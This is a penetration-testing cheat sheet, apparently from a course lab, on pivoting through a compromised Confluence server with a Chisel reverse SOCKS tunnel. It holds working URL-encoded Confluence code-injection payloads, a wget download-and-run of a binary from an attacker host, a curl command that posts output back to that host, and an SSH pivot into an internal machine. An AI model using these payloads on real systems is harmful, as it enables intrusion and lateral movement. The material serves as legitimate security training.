# Port Forwarding with Socat

How we intend out network setup to look once we have Chisel set up
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/HTTP-Tunneling-with-Chisel-1.png)

Copying the Chisel binary to the Apache2 server folder
>``` shell
>kali@kali:~$ sudo cp $(which chisel) /var/www/html/
>```

Starting Apache2
>``` shell
>kali@kali:~$ sudo systemctl start apache2
>
># ========== Expected Result ==========
>[sudo] password for kali: 
># =====================================
>```

The Wget payload we use to download the Chisel binary to /tmp/chisel on CONFLUENCE01 and make it executable
>``` shell
>wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
>```

The Wget payload executed within our cURL Confluence injection command
>``` shell
>kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
>```

The request for the Chisel binary hitting our Apache2 server
>``` shell
>kali@kali:~$ tail -f /var/log/apache2/access.log
>
># ========== Expected Result ==========
>...
>192.168.50.63 - - [03/Oct/2023:15:53:16 -0400] "GET /chisel HTTP/1.1" 200 8593795 "-" "Wget/1.20.3 (linux-gnu)"
># =====================================
>```

Starting the Chisel server on port 8080
>``` shell
>kali@kali:~$ chisel server --port 8080 --reverse
>
># ========== Expected Result ==========
>2023/10/03 15:57:53 server: Reverse tunnelling enabled
>2023/10/03 15:57:53 server: Fingerprint Pru+AFGOUxnEXyK1Z14RMqeiTaCdmX6j4zsa9S2Lx7c=
>2023/10/03 15:57:53 server: Listening on http://0.0.0.0:8080
># =====================================
>```

Starting tcpdump to listen on TCP/8080 through the tun0 interface
>``` shell
>kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080
>
># ========== Expected Result ==========
>tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
># =====================================
>```

The Chisel client command we run from the web shell
>``` shell
>/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
>```

Starting the Chisel client using the Confluence injection payload
>``` shell
>kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
>```

The error-collecting-and-sending command string
>``` shell
>/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
>```

The error-collecting-and-sending injection payload
>``` shell
>kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/
>```

The output from the failing Chisel command
>``` shell
>...
>16:30:50.915895 IP (tos 0x0, ttl 61, id 47823, offset 0, flags [DF], proto TCP (6), length 410)
>    192.168.50.63.50192 > 192.168.118.4.8080: Flags [P.], cksum 0x1535 (correct), seq 1:359, ack 1, win 502, options [nop,nop,TS val 391724691 ecr 3105669986], length 358: HTTP, length: 358
>        POST / HTTP/1.1
>        Host: 192.168.118.4:8080
>        User-Agent: curl/7.68.0
>        Accept: */*
>        Content-Length: 204
>        Content-Type: application/x-www-form-urlencoded
>
>        /tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by /tmp/chisel)/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/chisel) [|http]
>        0x0000:  4500 019a bacf 4000 3d06 f729 c0a8 db3f  E.....@.=..)...?
>        0x0010:  c0a8 2dd4 c410 1f90 d15e 1b1b 2b88 002d  ..-......^..+..-
>...
>```

The version of Chisel reported as part of the -h output, along with the version of Go used to compile it
>``` shell
>kali@kali:~$ chisel -h
>
># ========== Expected Result ==========
>  Usage: chisel [command] [--help]
>
>  Version: 1.8.1-0kali2 (go1.20.7)
>
>  Commands:
>    server - runs chisel in server mode
>    client - runs chisel in client mode
>
>  Read more:
>    https://github.com/jpillora/chisel
># =====================================
>```

Downloading Chisel 1.8.1 from the main Chisel repo, and copying it to the Apache web root directory
>``` shell
>kali@kali:~$ wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
>
># ========== Expected Result ==========
>--2023-10-03 16:33:35--  https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
>Resolving github.com (github.com)... 140.82.121.4
>Connecting to github.com (github.com)|140.82.121.4|:443... connected.
>...
>Length: 3494246 (3.3M) [application/octet-stream]
>Saving to: 'chisel_1.8.1_linux_amd64.gz'
>
>chisel_1.8.1_linux_am 100%[========================>]   3.33M  9.38MB/s    in 0.4s    
>
>2023-10-03 16:33:37 (9.38 MB/s) - 'chisel_1.8.1_linux_amd64.gz' saved [3494246/3494246]
># =====================================
>
>kali@kali:~$ gunzip chisel_1.8.1_linux_amd64.gz
>
>kali@kali:~$ sudo cp ./chisel /var/www/html   
>
># ========== Expected Result ==========
>[sudo] password for kali:
># =====================================
>```

The Wget payload executed within our cURL Confluence injection command, again
>``` shell
>kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
>```

Trying to start the Chisel client using the Confluence injection payload, again
>``` shell
>kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
>```

Inbound Chisel traffic logged by our tcpdump session
>``` shell
>kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080
>
># ========== Expected Result ==========
>tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
>...
>18:13:53.687533 IP (tos 0x0, ttl 63, id 53760, offset 0, flags [DF], proto TCP (6), length 276)
>    192.168.50.63.41424 > 192.168.118.4.8080: Flags [P.], cksum 0xce2b (correct), seq 1:225, ack 1, win 502, options [nop,nop,TS val 1290578437 ecr 143035602], length 224: HTTP, length: 224
>        GET / HTTP/1.1
>        Host: 192.168.118.4:8080
>        User-Agent: Go-http-client/1.1
>        Connection: Upgrade
>        Sec-WebSocket-Key: L8FCtL3MW18gHd/ccRWOPQ==
>        Sec-WebSocket-Protocol: chisel-v3
>        Sec-WebSocket-Version: 13
>        Upgrade: websocket
>
>        0x0000:  4500 0114 d200 4000 3f06 3f4f c0a8 323f  E.....@.?.?O..2?
>        0x0010:  c0a8 7604 a1d0 1f90 61a9 fe5d 2446 312e  ..v.....a..]$F1.
>        0x0020:  8018 01f6 ce2b 0000 0101 080a 4cec aa05  .....+......L...
>        0x0030:  0886 8cd2 4745 5420 2f20 4854 5450 2f31  ....GET./.HTTP/1
>        0x0040:  2e31 0d0a 486f 7374 3a20 3139 322e 3136  .1..Host:.192.16
>        0x0050:  382e 3131 382e 343a 3830 3830 0d0a 5573  8.118.4:8080..Us
>        0x0060:  6572 2d41 6765 6e74 3a20 476f 2d68 7474  er-Agent:.Go-htt
>        0x0070:  702d 636c 6965 6e74 2f31 2e31 0d0a 436f  p-client/1.1..Co
>        0x0080:  6e6e 6563 7469 6f6e 3a20 5570 6772 6164  nnection:.Upgrad
>        0x0090:  650d 0a53 6563 2d57 6562 536f 636b 6574  e..Sec-WebSocket
>        0x00a0:  2d4b 6579 3a20 4c38 4643 744c 334d 5731  -Key:.L8FCtL3MW1
>        0x00b0:  3867 4864 2f63 6352 574f 5051 3d3d 0d0a  8gHd/ccRWOPQ==..
>        0x00c0:  5365 632d 5765 6253 6f63 6b65 742d 5072  Sec-WebSocket-Pr
>        0x00d0:  6f74 6f63 6f6c 3a20 6368 6973 656c 2d76  otocol:.chisel-v
>        0x00e0:  330d 0a53 6563 2d57 6562 536f 636b 6574  3..Sec-WebSocket
>        0x00f0:  2d56 6572 7369 6f6e 3a20 3133 0d0a 5570  -Version:.13..Up
>        0x0100:  6772 6164 653a 2077 6562 736f 636b 6574  grade:.websocket
>        0x0110:  0d0a 0d0a                                ....
>18:13:53.687745 IP (tos 0x0, ttl 64, id 60604, offset 0, flags [DF], proto TCP (6), length 52)
>    192.168.118.4.8080 > 192.168.50.63.41424: Flags [.], cksum 0x46ca (correct), seq 1, ack 225, win 508, options [nop,nop,TS ...
>...
># =====================================
>```

Incoming connection logged by the Chisel server
>``` shell
>kali@kali:~$ chisel server --port 8080 --reverse
>
># ========== Expected Result ==========
>2023/10/03 15:57:53 server: Reverse tunnelling enabled
>2023/10/03 15:57:53 server: Fingerprint Pru+AFGOUxnEXyK1Z14RMqeiTaCdmX6j4zsa9S2Lx7c=
>2023/10/03 15:57:53 server: Listening on http://0.0.0.0:8080
>2023/10/03 18:13:54 server: session#2: Client version (1.8.1) differs from server version (1.8.1-0kali2)
>2023/10/03 18:13:54 server: session#2: tun: proxy#R:127.0.0.1:1080=>socks: Listening
># =====================================
>```

Using ss to check if our SOCKS port has been opened by the Kali Chisel server
>``` shell
>kali@kali:~$ ss -ntplu
>
># ========== Expected Result ==========
>Netid     State      Recv-Q     Send-Q           Local Address:Port            Peer Address:Port     Process
>udp       UNCONN     0          0                      0.0.0.0:34877                0.0.0.0:*
>tcp       LISTEN     0          4096                 127.0.0.1:1080                 0.0.0.0:*         users:(("chisel",pid=501221,fd=8))
>tcp       LISTEN     0          4096                         *:8080                       *:*         users:(("chisel",pid=501221,fd=6))
>tcp       LISTEN     0          511                          *:80                         *:*
># =====================================
>```

Installing Ncat with apt
>``` shell
>kali@kali:~$ sudo apt install ncat
>
># ========== Expected Result ==========
>Reading package lists... Done
>Building dependency tree... Done
>Reading state information... Done
>The following NEW packages will be installed:
>  ncat
>0 upgraded, 1 newly installed, 0 to remove and 857 not upgraded.
>Need to get 487 kB of archives.
>After this operation, 819 kB of additional disk space will be used.
>Get:1 http://http.kali.org/kali kali-rolling/main amd64 ncat amd64 7.94+dfsg1-1kali2 [393 kB]
>Fetched 487 kB in 5s (97.3 kB/s)
>Selecting previously unselected package ncat.
>(Reading database ... 298679 files and directories currently installed.)
>Preparing to unpack .../ncat_7.94+dfsg1-1kali2_amd64.deb ...
>Unpacking ncat (7.94+dfsg1-1kali2) ...
>Setting up ncat (7.94+dfsg1-1kali2) ...
>Processing triggers for man-db (2.11.2-3) ...
>Processing triggers for kali-menu (2023.4.5) ...
># =====================================
>```

A successful SSH connection through our Chisel HTTP tunnel
>``` shell
>kali@kali:~$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
>
># ========== Expected Result ==========
>The authenticity of host '10.4.50.215 (<no hostip for proxy command>)' can't be established.
>ED25519 key fingerprint is SHA256:IGz427yqW3ALf9CKYWNmVctA/Z/emwMWWRG5qQP8JvQ.
>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
>Warning: Permanently added '10.4.50.215' (ED25519) to the list of known hosts.
>database_admin@10.4.50.215's password:
>Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)
>
> * Documentation:  https://help.ubuntu.com
> * Management:     https://landscape.canonical.com
> * Support:        https://ubuntu.com/advantage
>
>0 updates can be applied immediately.
>
>Last login: Thu Jul 21 14:04:11 2022 from 192.168.97.19
>database_admin@pgbackup1:~$
># =====================================
>```

Lab 1 - Start VM Group 1. Follow the steps in this section, and set up Chisel as a reverse SOCKS proxy. SSH into PGDATABASE01 and retrieve the flag from /tmp/chisel_flag.
>``` shell
>
>```
>

Lab 2 - Start VM Group 2. Download the chisel_exercise_client binary from the Resources section to your Kali machine. If you're running the aarch64 build of Kali, download the chisel_exercise_client_aarch64 binary instead. There's a server running on port 8008 on PGDATABASE01. Set up a port forward using Chisel that allows you to run the binary you downloaded against port 8008 on PGDATABASE01.
>``` shell
>
>```
>
